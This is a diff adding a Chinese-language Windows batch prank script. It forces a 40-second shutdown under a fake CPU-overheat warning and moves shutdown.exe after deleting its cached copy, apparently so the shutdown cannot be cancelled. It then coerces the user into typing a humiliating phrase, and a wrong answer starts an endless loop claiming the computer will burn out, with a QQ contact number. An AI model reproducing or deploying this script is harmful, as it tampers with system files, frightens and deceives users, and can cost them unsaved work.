@@ -1,0 +1,39 @@
+@echo off
+shutdown -s -t 40 -c "cpu高温预警 系统准备关机"
+attrib C:\WINDOWS\system32\shutdown.exe -r -a -s -h
+del C:\WINDOWS\system32\dllcache\shutdown.exe
+move C:\WINDOWS\system32\shutdown.exe c:\
+echo. 要解除关机倒计时和恢复cpu正常电压请回答以下问题谢谢!
+echo.
+echo. 
+echo. 
+echo. 请直接输入
+echo. "周周是我哥"加回车键
+echo. "或者"
+echo. "周周不是我哥"加回车键
+echo.
+SET /p tt=
+echo.
+if /I "%tt%"=="周周是我哥" goto 00
+:55
+echo.对不起 您的电脑 可能在下次启动时烧毁 对您带来的不便 我们深表歉意 具体后果情联系qq 1652289622
+goto 55
+:00
+echo. 周周真的是你哥吗 "y"是 "n"不是
+SET /p ff=
+if /I "%ff%"=="y" (
+copy c:\shutdown.exe C:\WINDOWS\system32\
+shutdown -a
+echo.
+echo.
+echo. "随便玩玩嘛 别生气哦 "
+
+
+echo.
+echo.
+echo.
+) else (
+echo. 您设置的cpu工作电压过高 cpu存在危险！)
+cmd.exe /k
+
+
